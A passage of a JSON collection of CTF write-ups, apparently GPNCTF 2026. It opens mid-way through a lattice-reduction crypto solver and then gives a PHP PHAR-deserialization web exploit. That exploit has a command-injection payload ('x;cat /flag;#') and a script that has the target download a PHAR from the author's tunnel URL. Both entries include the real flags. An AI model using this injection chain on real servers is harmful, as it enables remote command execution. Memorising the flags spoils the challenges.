\\in \\mathbb{Z}_q^{128}.$$\n\nIn the solved instance, the combined matrix still did not have full rank. The observed rank was **94 out of 164**. Even so, the added constraints were enough to make the bounded solution recoverable with lattice reduction.\n\n---"
    },
    {
      "title": "Turning the Problem into a Lattice Problem",
      "content": "We need to solve\n\n$$A' s \\equiv y' \\pmod{q}$$\n\nwith\n\n$$0 \\leq s_i \\leq 9.$$\n\nEquivalently, there exists an integer vector $k$ such that\n\n$$A' s - y' = q k.$$\n\nRearranging:\n\n$$A' s - q k = y'.$$\n\nThis is a **bounded modular linear system**. The vector $s$ is not random over $\\mathbb{Z}_q^{164}$; it is inside a tiny box:\n\n$$s \\in [0,9]^{164} \\cap \\mathbb{Z}^{164}.$$\n\nFirst, compute one modular solution $x_0$ to\n\n$$A' x \\equiv y' \\pmod{q}.$$\n\nAll modular solutions can then be written as\n\n$$x = x_0 + z,$$\n\nwhere $z \\in \\ker(A' \\bmod q)$. Define the kernel lattice\n\n$$\\Lambda = \\left\\{ z \\in \\mathbb{Z}^{164} : A' z \\equiv 0 \\pmod{q} \\right\\}.$$\n\nThen the target secret is the vector in the affine lattice $x_0 + \\Lambda$ that lies inside the box $[0,9]^{164}$.\n\nThe center of this box is\n\n$$c = \\left(\\frac{9}{2}, \\frac{9}{2}, \\dots, \\frac{9}{2}\\right).$$\n\nTherefore, the recovery problem becomes a closest vector style problem:\n\n$$\\text{find } x \\in x_0 + \\Lambda \\text{ such that } \\|x - c\\| \\text{ is small.}$$\n\nOnce such an $x$ is found, we check whether all coordinates are valid digits and whether both modular systems are satisfied.\n\n---"
    },
    {
      "title": "Lattice Construction",
      "content": "The lattice is\n\n$$\\Lambda = \\ker_q(A').$$\n\nA basis $B$ for $\\Lambda$ can be built by computing the right kernel of $A'$ modulo $q$, then lifting the basis vectors to integer vectors.\n\nAfter that, reduce the basis with LLL and BKZ:\n\n$$B_{\\mathrm{red}} = \\operatorname{BKZ}\\!\\left(\\operatorname{LLL}(B)\\right).$$\n\nThen use **Babai's nearest-plane algorithm** to find a lattice vector $v \\in \\Lambda$ such that\n\n$$x_0 + v \\approx c.$$\n\nThe candidate is accepted only if\n\n$$s_i \\in \\{0,\\dots,9\\} \\quad \\text{for all } i,$$\n\nand\n\n$$A_{\\mathrm{multi}} \\, s \\equiv y_{\\mathrm{multi}} \\pmod{q},$$\n\nand\n\n$$A_{\\mathrm{single}} \\, s \\equiv y_{\\mathrm{single}} \\pmod{q}.$$\n\nIf all checks pass, the recovered vector is submitted to the service.\n\n---"
    },
    {
      "title": "Wrong oracle path",
      "content": "Using menu option `1` to recover $A$ does not match the initial target hash. This creates a clean-looking but wrong system."
    },
    {
      "title": "Batched menu option 2 queries",
      "content": "Menu option `2` is only safe when used with $n = 1$. Larger batches trigger different behavior and give a matrix that does not match the startup target.\n\nThe safe path is:\n\n\n\nfor each basis vector.",
      "code": "menu 2\nn = 1"
    },
    {
      "title": "One hash was not enough",
      "content": "Using only\n\n$$A_{\\mathrm{multi}} \\, s \\equiv y_{\\mathrm{multi}} \\pmod{q}$$\n\nleft too much ambiguity. Lattice reduction could produce candidates that looked geometrically close but failed verification.\n\nThe final solver used both maps: $A_{\\mathrm{multi}}$ and $A_{\\mathrm{single}}$. This gave enough constraints for BKZ and Babai nearest-plane to recover the correct bounded vector.\n\n---"
    },
    {
      "title": "Solver Outline",
      "content": "The final solver performs the following steps:\n\n1. Start the process locally or connect to the remote service.\n2. Parse the startup target hash $y_{\\mathrm{multi}}$.\n3. Query menu option `1` to obtain the additional secret hash $y_{\\mathrm{single}}$.\n4. Recover $A_{\\mathrm{multi}}$ using menu option `2` with $n = 1$.\n5. Recover $A_{\\mathrm{single}}$ using menu option `1`.\n6. Build the combined system $A' s \\equiv y' \\pmod{q}$.\n7. Compute a modular solution $x_0$ and the kernel lattice $\\Lambda$.\n8. Run LLL and BKZ.\n9. Apply Babai nearest-plane around the box center $c = (9/2,\\dots,9/2)$.\n10. Verify the candidate against both systems.\n11. Submit the recovered recipe vector.\n\nA successful run looks like this:\n\n\n\nThe line `Impossible the recipe was a lie.` is the **success path** in the binary. Locally, the flag only appears if the `FLAG` environment variable is set. On the remote service, the same success path prints the real flag.\n\n---",
      "code": "[+] target hash parsed\n[+] extra single-path secret hash parsed\n[+] recovered multi 164/164 columns\n[+] recovered single 164/164 columns\n[+] building combined q-ary lattice\n[+] combined rank 94 / 164\n[+] fpylll LLL done\n[+] fpylll BKZ-20 done\n[+] Babai center=9/2\n[+] Babai solved center=9/2\n[+] secret = ...\nImpossible the recipe was a lie."
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (solve.py):",
      "code": "#!/usr/bin/env sage -python\r\nimport argparse, re, socket, ssl as ssl_mod, subprocess, sys, time\r\n\r\nN=64; M=164; Q=12289; BETA=10\r\n\r\nclass Tube:\r\n    def __init__(self, host=None, port=None, use_ssl=False, local=None):\r\n        self.p=None; self.s=None\r\n        if local:\r\n            self.p=subprocess.Popen([local], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)\r\n        else:\r\n            raw=socket.create_connection((host,port), timeout=20)\r\n            if use_ssl:\r\n                ctx=ssl_mod.create_default_context(); self.s=ctx.wrap_socket(raw, server_hostname=host)\r\n            else: self.s=raw\r\n            self.s.settimeout(20)\r\n    def send(self,d:bytes):\r\n        if self.p:\r\n            self.p.stdin.write(d); self.p.stdin.flush()\r\n        else: self.s.sendall(d)\r\n    def recv_until(self, marker:bytes):\r\n        buf=bytearray()\r\n        while marker not in buf:\r\n            chunk=self.p.stdout.read(1) if self.p else self.s.recv(4096)\r\n            if not chunk: break\r\n            buf.extend(chunk)\r\n        return bytes(buf)\r\n    def recv_some(self):\r\n        if self.p: return self.p.stdout.read(4096)\r\n        return self.s.recv(4096)\r\n\r\ndef exact_vector_lines(buf:bytes, length=N, maxval=Q):\r\n    out=[]\r\n    for line in buf.splitlines():\r\n        nums=[int(x) for x in re.findall(rb\"\\d+\", line)]\r\n        if len(nums)>=length:\r\n            vals=nums[-length:]\r\n            if all(0 <= v < maxval for v in vals): out.append(vals)\r\n    return out\r\n\r\ndef parse_initial_hash(buf):\r\n    lines=exact_vector_lines(buf)\r\n    if lines: return lines[-1]\r\n    vals=[int(x) for x in re.findall(rb\"\\d+\", buf.split(b\"0) Check\")[0])]\r\n    if len(vals)<N: raise RuntimeError(\"could not parse initial hash\")\r\n    return vals[-N:]\r\n\r\ndef basis_vec(i):\r\n    v=[\"0\"]*M; v[i]=\"1\"; return \" \".join(v)\r\n\r\ndef recover_A_multi(io):\r\n    cols=[]\r\n    for j in range(M):\r\n        io.send((\"2\\n1\\n2\\n\"+basis_vec(j)+\"\\n\").encode())\r\n        buf=io.recv_until(b\"Your choice: \")\r\n        lines=exact_vector_lines(buf)\r\n        if not lines: raise RuntimeError(f\"failed to parse multi column {j}\\n{buf[-1000:]!r}\")\r\n        cols.append(lines[-1])\r\n        if (j+1)%20==0 or j+1==M: print(f\"[+] recovered multi {j+1}/{M} columns\", flush=True)\r\n    return [[cols[j][i] for j in range(M)] for i in range(N)]\r\n\r\ndef get_single_secret_hash(io):\r\n    # This hashes the real secret through the broken single-vector path.\r\n    io.send(b\"1\\ny\\n\")\r\n    buf=io.recv_until(b\"Your choice: \")\r\n    lines=exact_vector_lines(buf)\r\n    if not lines: raise RuntimeError(f\"failed to parse single secret hash\\n{buf[-1000:]!r}\")\r\n    return lines[-1]\r\n\r\ndef recover_B_single(io):\r\n    cols=[]\r\n    for j in range(M):\r\n        io.send((\"1\\nn\\n\"+basis_vec(j)+\"\\n\").encode())\r\n        buf=io.recv_until(b\"Your choice: \")\r\n        lines=exact_vector_lines(buf)\r\n        if not lines: raise RuntimeError(f\"failed to parse single column {j}\\n{buf[-1000:]!r}\")\r\n        cols.append(lines[-1])\r\n        if (j+1)%20==0 or j+1==M: print(f\"[+] recovered single {j+1}/{M} columns\", flush=True)\r\n    return [[cols[j][i] for j in range(M)] for i in range(N)]\r\n\r\ndef rref_aug(rows, y):\r\n    R=len(rows)\r\n    A=[[(int(x)%Q) for x in rows[i]]+[int(y[i])%Q] for i in range(R)]\r\n    piv=[]; row=0\r\n    for col in range(M):\r\n        pr=None\r\n        for r in range(row,R):\r\n            if A[r][col] % Q: pr=r; break\r\n        if pr is None: continue\r\n        A[row],A[pr]=A[pr],A[row]\r\n        inv=pow(A[row][col], -1, Q)\r\n        A[row]=[(x*inv)%Q for x in A[row]]\r\n        for r in range(R):\r\n            if r!=row and A[r][col]%Q:\r\n                f=A[r][col]%Q\r\n                A[r]=[(A[r][c]-f*A[row][c])%Q for c in range(M+1)]\r\n        piv.append(col); row+=1\r\n        if row==R: break\r\n    # Drop zero rows implicitly; consistency check.\r\n    for r in range(row,R):\r\n        if all(A[r][c]%Q==0 for c in range(M)) and A[r][M]%Q!=0:\r\n            raise RuntimeError(\"inconsistent equations\")\r\n    print(f\"[+] combined rank {len(piv)} / {M}\", flush=True)\r\n    return piv, A[:len(piv)]\r\n\r\ndef build_lattice_rows(rows, y):\r\n    piv,R=rref_aug(rows,y)\r\n    pset=set(piv); free=[i for i in range(M) if i not in pset]\r\n    x0=[0]*M\r\n    for i,c in enumerate(piv): x0[c]=R[i][M]\r\n    basis=[]\r\n    # q shifts on pivots\r\n    for c in piv:\r\n        v=[0]*M; v[c]=Q; basis.append(v)\r\n    # free integer variables\r\n    for f in free:\r\n        v=[0]*M; v[f]=1\r\n        for i,c in enumerate(piv):\r\n            val=(-R[i][f])%Q\r\n            if val>Q//2: val-=Q\r\n            v[c]=val\r\n        basis.append(v)\r\n    return basis,x0\r\n\r\ndef verify(rows,y,s):\r\n    if len(s)!=M or any(v<0 or v>=BETA for v in s): return False\r\n    return all(sum(int(rows[r][c])*int(s[c]) for c in range(M))%Q == int(y[r])%Q for r in range(len(rows)))\r\n\r\ndef fpylll_reduce(rows, bkz_block=0, bkz_loops=2):\r\n    from fpylll import IntegerMatrix, LLL, BKZ\r\n    B=IntegerMatrix.from_matrix(rows)\r\n    print(f\"[+] fpylll LLL start on {B.nrows}x{B.ncols}\", flush=True)\r\n    LLL.reduction(B, delta=0.99, eta=0.501, method='fast', float_type='double')\r\n    print(\"[+] fpylll LLL done\", flush=True)\r\n    if bkz_block and bkz_block>2:\r\n        print(f\"[+] fpylll BKZ-{bkz_block} start\", flush=True)\r\n        par=BKZ.Param(block_size=bkz_block, max_loops=bkz_loops)\r\n        BKZ.reduction(B, par)\r\n        print(f\"[+] fpylll BKZ-{bkz_block} done\", flush=True)\r\n    return [[int(B[i,j]) for j in range(B.ncols)] for i in range(B.nrows)]\r\n\r\ndef numpy_babai(B_rows, target):\r\n    import numpy as np\r\n    B=np.array(B_rows,dtype=np.float64); t=np.array(target,dtype=np.float64)\r\n    n,m=B.shape; Bstar=np.zeros((n,m)); mu=np.zeros((n,n)); norm=np.zeros(n)\r\n    for i in range(n):\r\n        v=B[i].copy()\r\n        for j in range(i):\r\n            if norm[j]:\r\n                mu[i,j]=np.dot(B[i],Bstar[j])/norm[j]; v-=mu[i,j]*Bstar[j]\r\n        Bstar[i]=v; norm[i]=np.dot(v,v)\r\n    w=t.copy(); coeff=np.zeros(n,dtype=np.int64)\r\n    for i in range(n-1,-1,-1):\r\n        if norm[i]:\r\n            z=int(round(np.dot(w,Bstar[i])/norm[i])); coeff[i]=z; w-=z*B[i]\r\n    return [int(round(x)) for x in coeff.dot(B)]\r\n\r\ndef fpylll_babai(B_rows, target):\r\n    try:\r\n        from fpylll import IntegerMatrix, GSO\r\n        B=IntegerMatrix.from_matrix(B_rows)\r\n        M_gso=GSO.Mat(B, float_type='double'); M_gso.update_gso()\r\n        coeff=M_gso.babai(tuple(int(x) for x in target))\r\n        out=[0]*len(target)\r\n        for i,z in enumerate(coeff):\r\n            if z:\r\n                for j in range(len(target)): out[j]+=int(z)*int(B[i,j])\r\n        return out\r\n    except Exception as e:\r\n        print(f\"[!] fpylll babai failed: {e}\", flush=True)\r\n        return numpy_babai(B_rows,target)\r\n\r\ndef cand_from_close(target, close, center2):\r\n    cand=[]\r\n    for i in range(M):\r\n        val=int(target[i])-int(close[i])+center2\r\n        if val%2: return None\r\n        cand.append(val//2)\r\n    return cand\r\n\r\ndef try_embedding(B_rows, target, center2, rows, y, bkz_block):\r\n    from fpylll import IntegerMatrix, LLL, BKZ\r\n    for K in [1,2,4,8,16,32,64,128,256,512,1024,2048,4096,8192,16384]:\r\n        print(f\"[+] embedding center={center2}/2 K={K}\", flush=True)\r\n        emb=[r[:] + [0] for r in B_rows]\r\n        emb.append([int(v) for v in target]+[K])\r\n        E=IntegerMatrix.from_matrix(emb)\r\n        LLL.reduction(E, delta=0.99, eta=0.501, method='fast', float_type='double')\r\n        if bkz_block and bkz_block>2:\r\n            BKZ.reduction(E, BKZ.Param(block_size=bkz_block, max_loops=1))\r\n        for i in range(E.nrows):\r\n            last=int(E[i,E.ncols-1])\r\n            if abs(last)!=K: continue\r\n            sign=1 if last==K else -1\r\n            z=[sign*int(E[i,j]) for j in range(M)]\r\n            cand=[]; ok=True\r\n            for val0 in z:\r\n                val=val0+center2\r\n                if val%2: ok=False; break\r\n                cand.append(val//2)\r\n            if ok and verify(rows,y,cand):\r\n                print(f\"[+] embedding solved K={K}\", flush=True); return cand\r\n    return None\r\n\r\ndef solve_secret(rows,y,bkz_block=20):\r\n    print(\"[+] building combined q-ary lattice\", flush=True)\r\n    basis,x0=build_lattice_rows(rows,y)\r\n    red=fpylll_reduce(basis, bkz_block=bkz_block, bkz_loops=2)\r\n    red2=[[2*v for v in r] for r in red]\r\n    centers=[9,8,10,7,11,6,12,0]\r\n    for center2 in centers:\r\n        target=[2*int(x0[i])-center2 for i in range(M)]\r\n        print(f\"[+] Babai center={center2}/2\", flush=True)\r\n        for close in (fpylll_babai(red2,target), numpy_babai(red2,target)):\r\n            cand=cand_from_close(target,close,center2)\r\n            if cand is not None and verify(rows,y,cand):\r\n                print(f\"[+] Babai solved center={center2}/2\", flush=True); return cand\r\n    print(\"[+] Babai failed, trying embedding\", flush=True)\r\n    for center2 in centers[:-1]:\r\n        target=[2*int(x0[i])-center2 for i in range(M)]\r\n        cand=try_embedding(red2,target,center2,rows,y,bkz_block)\r\n        if cand is not None: return cand\r\n    raise RuntimeError(\"combined lattice failed; try --bkz 30\")\r\n\r\ndef submit(io,s):\r\n    io.send((\"0\\n\"+\" \".join(map(str,s))+\"\\n\").encode())\r\n    out=bytearray(); t0=time.time()\r\n    while time.time()-t0<5:\r\n        try:\r\n            chunk=io.recv_some()\r\n            if not chunk: break\r\n            out.extend(chunk)\r\n            if b\"}\" in out or b\"Wrong guess\" in out: break\r\n        except Exception: break\r\n    return bytes(out)\r\n\r\ndef main():\r\n    ap=argparse.ArgumentParser()\r\n    ap.add_argument('--host', default='torched-tiramisu-under-sauteed-salsa-verde-ejof.gpn24.ctf.kitctf.de')\r\n    ap.add_argument('--port', type=int, default=443)\r\n    ap.add_argument('--ssl', action='store_true', default=True)\r\n    ap.add_argument('--no-ssl', dest='ssl', action='store_false')\r\n    ap.add_argument('--local')\r\n    ap.add_argument('--bkz', type=int, default=20)\r\n    args=ap.parse_args()\r\n    io=Tube(host=args.host, port=args.port, use_ssl=args.ssl, local=args.local)\r\n    banner=io.recv_until(b\"Your choice: \")\r\n    y0=parse_initial_hash(banner)\r\n    print('[+] target hash parsed', flush=True)\r\n    y1=get_single_secret_hash(io)\r\n    print('[+] extra single-path secret hash parsed', flush=True)\r\n    A=recover_A_multi(io)\r\n    B=recover_B_single(io)\r\n    rows=A+B; yy=y0+y1\r\n    s=solve_secret(rows,yy,bkz_block=args.bkz)\r\n    print('[+] secret =', ' '.join(map(str,s)), flush=True)\r\n    out=submit(io,s)\r\n    text=out.decode(errors='replace')\r\n    m=re.search(r\"([A-Za-z0-9_?!{}\\-]+\\{[^}\\n]+\\})\", text)\r\n    if m: print(f\"<FLAG>{m.group(1)}</FLAG>\")\r\n    else: print(text)\r\nif __name__=='__main__': main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "GPNCTF{COMp1LEr5_ARE_Y0uR_Fr1eND_7Hey_WoU1D_nEV3r}",
  "lessonsLearned": [
    "The challenge was not just a generic lattice problem. The main trick was noticing that the compiled binary did not behave like the clean source-level model.",
    "The important implementation-level lesson is:",
    "$$\\text{same-looking hash API} \\neq \\text{same linear map}.$$",
    "Once the real maps used by the binary were recovered, the rest became a bounded modular lattice recovery problem.",
    "The flag summarizes the bug nicely:",
    "`",
    "COMp1LEr5_ARE_Y0uR_Fr1eND_7Hey_WoU1D_nEV3r",
    "`"
  ]
}
,
{
  "id": "gpnctf2026-web-perry",
  "title": "Pharry",
  "ctfName": "GPNCTF 2026",
  "category": "Web",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-06-09",
  "author": "Nattt",
  "tags": [],
  "description": "Target ini kelihatan sederhana, tapi ada dua lapisan yang bikin exploit-nya jalan:",
  "problemDescription": "Target ini kelihatan sederhana, tapi ada dua lapisan yang bikin exploit-nya jalan:\n\n1. `md5_file($file)` dan `file_get_contents($file)` menerima input path yang bebas.\n2. Class `User` punya destructor yang menjalankan `system(\"rm \".$this->avatar_path);`.\n\nItu artinya, kalau kita bisa memaksa PHP meng-unserialize object `User`, kita dapat command injection lewat properti `avatar_path`.",
  "tools": [],
  "analysis": "File `index.php`:\n\n```php\n$file = $_GET['path'];\n$res = md5_file($file);\nif ($res == FALSE){\n    file_put_contents(\"/tmp/remote_file.jpg\",file_get_contents($file));\n    $res = md5_file(\"/tmp/remote_file.jpg\");\n}\nif ($res == 0xdeadbeef){\n    echo \"Congratulations! Here is not your flag: \".file_get_contents(\"flag.txt\");\n} else{\n    echo $res;\n}\n```\n\nDan class `User`:\n\n```php\nclass User {\n    public $avatar_path;\n    public $name;\n    public $password;\n    function __construct($name, $password) {\n        ...\n        system(\"touch \".$this->avatar_path);\n    }\n    function __destruct() {\n        system(\"rm \".$this->avatar_path);\n    }\n}\n```\n\nKunci utamanya:\n\n- `phar://` bisa memicu unserialize metadata saat archive dibuka.\n- Destructor `User` bisa dipakai buat eksekusi command.",
  "solution": [
    {
      "title": "Idea",
      "content": "Kalau kita punya file PHAR yang metadata-nya berisi object `User`, lalu file itu dibaca lewat `phar://`, destructor akan jalan saat request selesai.\n\nSupaya file PHAR itu ada di server target, saya pakai dua tahap:\n\n1. Request pertama ke URL publik milik sendiri.\n2. URL publik itu balas `404` di hit pertama, lalu `200` di hit kedua.\n3. Karena `md5_file()` ke URL itu gagal, kode masuk ke branch `file_get_contents()`.\n4. Hit kedua ngirim bytes PHAR asli, jadi server menulisnya ke `/tmp/remote_file.jpg`.\n5. Request kedua ke target pakai `phar:///tmp/remote_file.jpg/x.txt`.\n6. Metadata PHAR di-unserialize, destructor `User` dieksekusi, dan command injection jalan."
    },
    {
      "title": "Payload",
      "content": "Properti `avatar_path` diisi string seperti:\n\n\n\nJadi destructor menjalankan:\n\n\n\nOutput `cat /flag` muncul di response.",
      "code": "x;cat /flag;#"
    },
    {
      "title": "Hasil",
      "content": "Flag yang keluar:",
      "code": "02129bb861061d1a052c592e2dc6b383GPNCTF{We8_15_f0r_wEe85_4ND_SUck5_phP_1s_coo1_tOugh}"
    },
    {
      "title": "Catatan",
      "content": "- Endpoint publik saya pakai tunnel ke server lokal sendiri.\n- PHAR bytes digenerate dengan `php -d phar.readonly=0`.\n- Kode bantu exploit ada di [exploit.py](/home/nata/ctf/GPNCTF2026/web/Perry/pharry/exploit.py)."
    },
    {
      "title": "Solver Script",
      "content": "Script solver lengkap (exploit.py):",
      "code": "#!/usr/bin/env python3\r\nimport os\r\nimport re\r\nimport subprocess\r\nimport sys\r\nfrom urllib.parse import urlencode\r\nfrom urllib.request import Request, urlopen\r\n\r\nTARGET = \"https://braised-tofu-wrapped-in-toasted-tomato-xgza.gpn24.ctf.kitctf.de/\"\r\nPUBLIC_URL = \"https://acoustic-meets-beaver-exciting.trycloudflare.com/dyn.php\"\r\nPAYLOAD_PATH = \"/tmp/payload.phar\"\r\nCOUNTER_PATH = \"/tmp/dyn_count\"\r\n\r\n\r\ndef build_phar(payload_cmd):\r\n    if os.path.exists(PAYLOAD_PATH):\r\n        os.unlink(PAYLOAD_PATH)\r\n\r\n    php_code = rf'''\r\nclass User {{\r\n    public $avatar_path;\r\n    public $name;\r\n    public $password;\r\n}}\r\n\r\n$u = new User();\r\n$u->avatar_path = {payload_cmd!r};\r\n$u->name = 'a';\r\n$u->password = 'b';\r\n\r\n$p = new Phar({PAYLOAD_PATH!r});\r\n$p['x.txt'] = 'X';\r\n$p->setStub(\"<?php __HALT_COMPILER(); ?>\");\r\n$p->setMetadata($u);\r\n'''\r\n    subprocess.run(\r\n        [\"php\", \"-d\", \"phar.readonly=0\", \"-r\", php_code],\r\n        check=True,\r\n    )\r\n\r\n\r\ndef http_get(url, params=None):\r\n    if params:\r\n        url = url + \"?\" + urlencode(params)\r\n    req = Request(url, headers={\"User-Agent\": \"Mozilla/5.0\"})\r\n    with urlopen(req, timeout=30) as resp:\r\n        body = resp.read()\r\n        return resp.status, body\r\n\r\n\r\ndef main():\r\n    payload_cmd = \"x;cat flag.txt;#\"\r\n    if len(sys.argv) > 1:\r\n        payload_cmd = sys.argv[1]\r\n\r\n    build_phar(payload_cmd)\r\n    try:\r\n        os.unlink(COUNTER_PATH)\r\n    except FileNotFoundError:\r\n        pass\r\n\r\n    http_get(TARGET, {\"path\": PUBLIC_URL})\r\n    _, body = http_get(TARGET, {\"path\": \"phar:///tmp/remote_file.jpg/x.txt\"})\r\n    text = body.decode(\"utf-8\", errors=\"ignore\")\r\n    m = re.search(r\"([A-Za-z0-9_]{8,}\\{[^}]+\\})\", text)\r\n    if m:\r\n        print(f\"<FLAG>{m.group(1)}</FLAG>\")\r\n        return\r\n    print(text)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
    }
  ],
  "terminalOutputs": [],
  "flag": "02129bb861061d1a052c592e2dc6b383GPNCTF{We8_15_f0r_wEe85_4ND_SUck5_phP_1s_coo1_tOugh}",
  "lessonsLearned": []
}
];
